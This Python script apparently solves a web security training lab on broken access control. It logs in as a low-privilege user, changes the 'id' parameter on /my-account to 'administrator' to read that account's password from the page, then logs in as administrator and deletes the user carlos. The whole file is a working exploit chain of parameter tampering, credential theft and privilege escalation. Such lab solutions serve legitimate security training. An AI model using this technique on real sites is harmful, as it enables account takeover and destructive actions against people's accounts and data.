#!/usr/bin/env python3
"""User ID controlled by request parameter with password disclosure"""

import bs4

import lab_08

class Lab(lab_08.Lab):
    """Wrapper"""

    @staticmethod
    def get_password(page: str) -> str:
        """Get the password from the input field"""
        soup = bs4.BeautifulSoup(page, features="lxml")
        pw_input = soup.find("input",
                             attrs={"name": "password", "type": "password"})
        return pw_input["value"]

def main() -> None:
    """Entry point"""
    site = Lab()
    csrf = site.csrf_token("/login")
    site.login(username="wiener", password="peter", csrf=csrf)
    response = site.session.get(site.url + "/my-account",
                                params={"id": "administrator"},
                                allow_redirects=False)
    response.raise_for_status()
    password = site.get_password(response.text)

    # New session
    site = Lab()
    csrf = site.csrf_token("/login")
    site.login(username="administrator", password=password, csrf=csrf)
    site.delete_user(admin_panel="/admin", username="carlos")

if __name__ == "__main__":
    main()
